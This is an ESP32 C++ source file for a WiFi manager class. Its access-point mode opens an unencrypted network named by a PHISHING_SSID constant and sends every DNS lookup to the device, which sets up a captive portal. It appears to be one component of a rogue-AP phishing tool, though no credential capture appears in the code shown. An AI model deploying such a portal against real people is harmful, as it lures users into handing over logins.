#include "WiFiManager.h"
#include <esp_wifi.h>

MyWiFiManager wifiMgr;

MyWiFiManager::MyWiFiManager() {
    currentState = WIFI_STATE_OFF;
}

void MyWiFiManager::begin() {
    WiFi.mode(WIFI_OFF);
}

void MyWiFiManager::update() {
    if (currentState == WIFI_STATE_AP_MODE) {
        dnsServer.processNextRequest();
    }
}

void MyWiFiManager::startStationMode() {
    stopWiFi();
    WiFi.mode(WIFI_STA);
    WiFi.begin(DEFAULT_SSID, DEFAULT_PASS);
    currentState = WIFI_STATE_STA_CONNECTING;
    // We can check status in update()
}

void MyWiFiManager::startAPMode() {
    stopWiFi();
    WiFi.mode(WIFI_AP);
    
    // Config AP
    IPAddress localIP(4, 3, 2, 1);
    IPAddress gatewayIP(4, 3, 2, 1);
    IPAddress subnet(255, 255, 255, 0);
    
    WiFi.softAPConfig(localIP, gatewayIP, subnet);
    WiFi.softAP(PHISHING_SSID); // Open network
    
    // Start DNS Server for Captive Portal
    dnsServer.start(53, "*", localIP);
    
    currentState = WIFI_STATE_AP_MODE;
}

void MyWiFiManager::stopWiFi() {
    dnsServer.stop();
    WiFi.disconnect(true);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    currentState = WIFI_STATE_OFF;
}

WiFiState MyWiFiManager::getState() {
    if (currentState == WIFI_STATE_STA_CONNECTING && WiFi.status() == WL_CONNECTED) {
        currentState = WIFI_STATE_STA_CONNECTED;
    }
    return currentState;
}

String MyWiFiManager::getIP() {
    if (currentState == WIFI_STATE_AP_MODE) return WiFi.softAPIP().toString();
    if (currentState == WIFI_STATE_STA_CONNECTED) return WiFi.localIP().toString();
    return "0.0.0.0";
}

DNSServer* MyWiFiManager::getDNSServer() {
    return &dnsServer;
}
